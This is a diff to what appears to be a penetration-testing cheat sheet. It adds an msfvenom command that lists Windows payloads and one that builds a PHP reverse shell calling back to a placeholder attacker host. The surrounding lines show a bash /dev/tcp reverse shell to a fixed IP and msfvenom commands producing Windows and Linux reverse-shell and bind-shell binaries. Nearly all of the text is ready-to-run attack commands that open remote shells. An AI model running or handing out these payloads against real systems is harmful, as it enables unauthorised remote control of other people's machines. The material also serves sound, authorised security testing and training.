@@ -866,6 +866,11 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 # Msfvenom
 
+## list all payloads of msfvenom
+~~~ bash
+msfvenom -l payloads --platform windows --arch x64
+~~~
+
 ## ReverseShell(Windows)
 ~~~ bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f exe > reverseshell.exe
@@ -879,6 +884,11 @@ msfvenom -p linux/x64/shell_bind_tcp RHOST=victim.ip LPORT=4444 -f elf -o bindsh
 ## ReverseShell(Linux)
 ~~~ bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o reverseshell.elf
+~~~
+
+## ReverseShell(PHP)
+~~~ bash
+msfvenom -p php/reverse_php LHOST=attacker.ip LPORT=443 -f raw > shell.pHP
 ~~~
 
 
